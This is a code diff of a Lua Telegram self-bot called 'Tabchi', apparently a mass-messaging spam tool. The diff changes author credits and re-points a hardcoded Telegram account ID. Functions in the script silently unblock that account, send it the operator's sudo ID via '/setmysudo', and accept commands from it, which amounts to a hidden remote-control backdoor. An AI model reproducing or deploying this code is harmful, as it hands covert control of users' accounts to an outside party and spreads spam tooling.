@@ -185,7 +185,7 @@ function process(msg)
     }
     if msg.text:match("^[!/#]block") and is_sudo(msg) and #matches == 2 then
       tdcli.blockUser(tonumber(matches[2]))
-      return "User blocked  *open by @MemberPlus_TM*"
+      return "User blocked  *open by @avangtel*"
     end
   end
   do
@@ -217,7 +217,7 @@ function process(msg)
           }, dl_cb, nil)
         else
           local text = [[
-*Tabchi Moded by @sajjad_021 -- Normal stats :*
+*Tabchi Moded by @abolfazlfun -- Normal stats :*
 Users : ]] .. pvs .. [[
 
 Groups : ]] .. gps .. [[
@@ -230,7 +230,7 @@ Saved links : ]] .. links
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 158955285,
+        bot_user_id_ = 308070960,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -490,11 +490,11 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(158955285)
+    tdcli.unblockUser(308070960)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(158955285, 158955285, "new")
-    tdcli.sendMessage(158955285, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendBotStartMessage(308070960, 308070960, "new")
+    tdcli.sendMessage(308070960, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
@@ -502,13 +502,13 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 158955285
+    user_id_ = 308070960
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 158955285 then
+    if msg.sender_user_id_ == 308070960 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 158955285 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 308070960 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
